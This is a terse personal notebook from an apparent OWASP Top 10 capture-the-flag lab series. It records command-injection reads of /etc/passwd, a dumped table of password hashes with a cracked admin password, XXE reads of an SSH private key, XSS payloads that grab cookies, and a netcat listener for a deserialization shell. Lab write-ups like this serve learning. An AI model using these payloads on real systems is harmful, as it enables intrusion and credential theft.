# OWASP Top 10 ... in 10 days

# Date: 17.09.2020

# IPs
>day 01: `10.10.212.139`
day 02: `10.10.107.63`
day 03: `10.10.146.107`
day 04: `10.10.91.218`
day 05: `10.10.88.61`
day 06: `10.10.45.97`
day 07: `10.10.230.10` - bad machine (error on www)
		`10.10.33.71` - that worked just fine
day 08: `10.10.81.217`
day 09: `10.10.117.71`
day 10: ``

------------
## Day 1
### Injection

IP: `10.10.212.139`
Host: `http://10.10.212.139/evilshell.php`

commands used:
- ls
- cat /etc/passwd
- id
- cat /etc/passwd
- cat /etc/os-release
- cat /etc/motd.d/00-header


------------
## Day 2
### Broken Authentication

IP:`10.10.107.63`
Host: `http://10.10.107.63:8888/`

register as " darren", login, used devtools to get the flag
same path for " arthur"



------------
## Day 3
### Sensitive Data Exposure

IP: `10.10.146.107`
Host: `10.10.146.107`

list of columns in table: `PRAGMA table_info(customers);`

find /assets (using gobuster dir -u http://IP -w wordlist.txt)
dl webapp.db from /assets db
used sqlite3 webapp.db

''
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
''
decode admin hash password with crackstation: `qwertyuiop`

login to the website to get the flag



------------
## Day 4
### XML External Entity

IP:`10.10.91.218`

BURP --> repeater --> XXE modifications
" /etc/passwd , /home/falcon/.ssh/id_rsa"



------------
## Day 5
### Broken Access Control
IP: `10.10.88.61`
Host: `10.10.88.61`
noot:test1234


------------
## Day 6
### Security Misconfiguration

IP:`10.10.45.97`

gobuster dir -u http://<IP> -w wordlist.txt

during scan i went looking online and found corret ones pensive:PensiveNotes


------------
## Day 7
### Cross-site Scripting

IP:`10.10.230.10` - bad machine
   `10.10.33.71`
Host: `http://10.10.33.71/reflected`


Payload <script>alert("Hello")</script> 
Payload <script>alert(window.location.hostname)</script> 
Payload <script>alert(document.cookie)</script> 
Payload <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script> - thnx google!


------------
## Day 8
### Insecure Deserialization

IP:`10.10.81.217`
Host: `10.10.81.217`

decode sessionID to get 1st flag :) echo -n <sessiionId> | base64 -d

create python file to make a payload, run nc -lvnp and just tha flag is .. there :)

------------
## Day 9
### Components with Known Vulnerabilities

IP:`10.10.117.71`



------------
## Day 10
### Insufficent Logging & Monitoring



